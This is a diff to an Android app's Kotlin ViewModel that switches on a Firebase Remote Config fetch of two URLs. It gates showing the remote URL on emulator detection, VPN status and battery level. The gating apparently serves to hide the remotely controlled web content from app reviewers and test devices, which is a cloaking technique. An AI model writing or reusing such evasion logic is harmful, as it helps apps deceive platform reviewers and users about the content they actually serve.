@@ -1,41 +1,40 @@
-package com.edurda77.catchcoins
+package catchcoins.box
 
 import android.os.Build
 import androidx.lifecycle.MutableLiveData
 import androidx.lifecycle.ViewModel
 import androidx.lifecycle.viewModelScope
+import com.google.firebase.ktx.BuildConfig
+import com.google.firebase.ktx.Firebase
+import com.google.firebase.remoteconfig.ktx.remoteConfig
+import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
 import dagger.hilt.android.lifecycle.HiltViewModel
-import kotlinx.coroutines.launch
 import java.util.Locale
 import javax.inject.Inject
+import kotlinx.coroutines.launch
 
 @HiltViewModel
 class MainViewModel @Inject constructor(private val repo: SystemRepo) : ViewModel() {
     private val _showData = MutableLiveData<MainState>(MainState.Loading)
     val showData = _showData
-    //private val remoteConfig = Firebase.remoteConfig
+    private val remoteConfig = Firebase.remoteConfig
 
     init {
-        //getFromLocal()
+        getFromLocal()
     }
-    fun getFromLocal(
-        //pathUrl: String = "",
-        //checkedInternetConnection: Boolean,
-        //vpnActive: Boolean,
-        //batteryLevel: Int,
-        //deeplink: String?
-    ) {
+    private fun getFromLocal() {
         val pathUrl = repo.getDataFromSharedPreferences()
+        val checkInternet = repo.checkedInternetConnection()
         if (pathUrl != "") {
-            if (repo.checkedInternetConnection()) {
+            if (checkInternet) {
                 _showData.value = MainState.Success(url = pathUrl)
 
             } else {
                 _showData.value = MainState.NoInternet
             }
         } else {
-            if (repo.checkedInternetConnection()) {
-                /*viewModelScope.launch {
+            if (checkInternet) {
+                viewModelScope.launch {
                     val configSettings = remoteConfigSettings {
                         minimumFetchIntervalInSeconds = 3600
                     }
@@ -46,6 +45,8 @@ class MainViewModel @Inject constructor(private val repo: SystemRepo) : ViewMode
                                 val isCheckedVpn = remoteConfig.getBoolean("to")
                                 val resultUrl = remoteConfig.getString("url")
                                 val resultUrl2 = remoteConfig.getString("url2")
+                                val vpnActive = repo.vpnActive()
+                                val batteryLevel = repo.getBatteryLevel()
                                 if (isCheckedVpn) {
                                     viewModelScope.launch {
                                         if (checkIsEmu() || resultUrl.isEmpty() || resultUrl2.isEmpty() || vpnActive || batteryLevel > 99) {
@@ -84,7 +85,7 @@ class MainViewModel @Inject constructor(private val repo: SystemRepo) : ViewMode
                         }.addOnFailureListener {
                             _showData.value = MainState.NoInternet
                         }
-                }*/
+                }
 
             } else {
                 _showData.value = MainState.NoInternet
@@ -93,7 +94,7 @@ class MainViewModel @Inject constructor(private val repo: SystemRepo) : ViewMode
     }
 
     private fun checkIsEmu(): Boolean {
-        //if (BuildConfig.DEBUG) return false
+        if (BuildConfig.DEBUG) return false
         val phoneModel = Build.MODEL
         val buildProduct = Build.PRODUCT
         val buildHardware = Build.HARDWARE
@@ -124,7 +125,7 @@ class MainViewModel @Inject constructor(private val repo: SystemRepo) : ViewMode
 
 
 
-    fun parseSub(url:String): Map<String, String> {
+    private fun parseSub(url:String): Map<String, String> {
         val regex = Regex("""(?<=sub)\d+=([^&]+)""")
         val matches = regex.findAll(url)
         val subIds = mutableMapOf<String, String>()
